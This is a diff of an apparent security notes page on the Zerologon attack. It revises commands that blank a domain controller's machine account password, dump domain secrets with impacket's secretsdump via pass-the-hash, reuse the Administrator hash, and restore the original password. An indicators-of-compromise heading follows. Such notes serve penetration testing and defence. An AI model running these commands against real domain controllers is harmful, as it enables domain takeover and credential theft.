@@ -162,10 +162,14 @@
 <p>If there are any issues, update or reinstall impacket. Then, in the same directory as the cloned repository, run the following command:</p>
 <pre><code class="language-bash">python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
 </code></pre>
-<p>Then, the DC's machine accounts hash is set to <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>, and the old hash should be printed to the screen, note this for later. This can be used with impacket's pass-the-hash functionality. I.e. dumping secret:</p>
-<pre><code class="language-bash">sudo secretsdump.py -just-dc -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
+<p>Then, the DC's machine accounts hash is set to <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>. This can be used with impacket's pass-the-hash functionality. I.e. dumping secret:</p>
+<pre><code class="language-bash">sudo secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
 </code></pre>
-<p>To reinstall the old machine password, run the following command:</p>
+<p>To reinstall the old machine password, you must use the Administrator hash you got from secretsdump, and then run secrets dump again using that hash:</p>
+<pre><code>sudo secretsdump.py -hashes :&lt;Administrator NTLM Hash&gt; 'DOMAIN/Administrator@dc_ip_addr'
+</code></pre>
+<p>This will give you much more output than before, and this will also give you the old machine account hash:</p>
+<p><img src="./images/Pasted%20image%2020230629110911.png" alt="image" /></p>
 <pre><code class="language-bash">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
 </code></pre>
 <h4 id="indicators-of-compromise"><a class="header" href="#indicators-of-compromise">Indicators of Compromise</a></h4>
